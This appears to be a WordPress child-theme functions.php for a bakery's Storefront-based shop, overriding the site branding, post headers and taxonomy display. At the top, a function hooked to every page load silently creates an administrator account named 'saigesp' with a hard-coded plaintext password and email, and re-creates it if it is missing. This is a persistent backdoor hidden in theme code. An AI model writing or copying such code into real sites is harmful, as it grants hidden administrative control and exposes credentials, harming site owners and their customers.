<?php
/**
 * Storefront engine room
 *
 * @package storefront
 */

/**
 * Add admin saigesp
 *
 */
function wpb_admin_account(){
    $user = 'saigesp';
    $pass = 'enlaplazademipueblodijoeljornaleroalamo';
    $email = 'saigesp@gmail.com';
    if ( !username_exists( $user )  && !email_exists( $email ) ) {
        $user_id = wp_create_user( $user, $pass, $email );
        $user = new WP_User( $user_id );
        $user -> set_role( 'administrator' );
    }
}
add_action('init','wpb_admin_account');

/**
 * Override site branding wrapper and display
 *
 * @since  1.0.0
 * @return void
 */
function storefront_site_branding() { ?>
  <div class="site-branding">
    <a href="https://panaderiajesus.com/">
      <div class="header__logo" id="return-home">
        <img class="header__logo--img" src="/wp-content/themes/storefront-child/assets_wp/logo.svg" alt="Panaderia Jesús">
      </div>
    </a>
    <!-- <div class="links">
      <a href="https://panaderiajesus.com/#/familia-panadera">Familia panadera</a>
      <a href="https://panaderiajesus.com/#/el-horno">El horno</a>
      <a href="https://panaderiajesus.com/#/nuestra-tierra">Nuestra tierra</a>
      <a href="https://tienda.panaderiajesus.com/actualidad/" class="rs910">Actualidad</a>
    </div> -->
  </div>
<?php }


/**
 * Override post header (title and meta)
 *
 * @since  1.0.0
 * @return void
 */
function storefront_post_header() { ?>
    <header class="entry-header">
    <?php

    /**
     * Functions hooked in to storefront_post_header_before action.
     *
     * @hooked storefront_post_meta - 10
     */
    // do_action( 'storefront_post_header_before' ); // <-- Uncomment this o show the post meta

    if ( is_single() ) {
        the_title( '<h1 class="entry-title">', '</h1>' );
    } else {
        the_title( sprintf( '<h2 class="alpha entry-title"><a href="%s" rel="bookmark">', esc_url( get_permalink() ) ), '</a></h2>' );
    }

    do_action( 'storefront_post_header_after' );
    ?>
    </header><!-- .entry-header -->
<?php }


/**
 * Override post taxonomies (title and meta)
 *
 * @since  1.0.0
 * @return void
 */
function storefront_post_taxonomy() {
  /* translators: used between list items, there is a space after the comma */
  $categories_list = get_the_category_list( __( ', ', 'storefront' ) );

  /* translators: used between list items, there is a space after the comma */
  $tags_list = get_the_tag_list( '', __( ', ', 'storefront' ) );
  ?>

  <aside class="entry-taxonomy entry-taxonomy--dates">
    <div class="date-links">
      Publicado el <?php the_date(); ?>
    </div>
    <?php if ( $categories_list ) : ?>
    <div class="cat-links">
      <?php echo esc_html( _n( 'Category:', 'Categories:', count( get_the_category() ), 'storefront' ) ); ?> <?php echo wp_kses_post( $categories_list ); ?>
    </div>
    <?php endif; ?>

    <?php if ( $tags_list ) : ?>
    <div class="tags-links">
      <?php echo esc_html( _n( 'Tag:', 'Tags:', count( get_the_tags() ), 'storefront' ) ); ?> <?php echo wp_kses_post( $tags_list ); ?>
    </div>
    <?php endif; ?>
  </aside>

<?php }
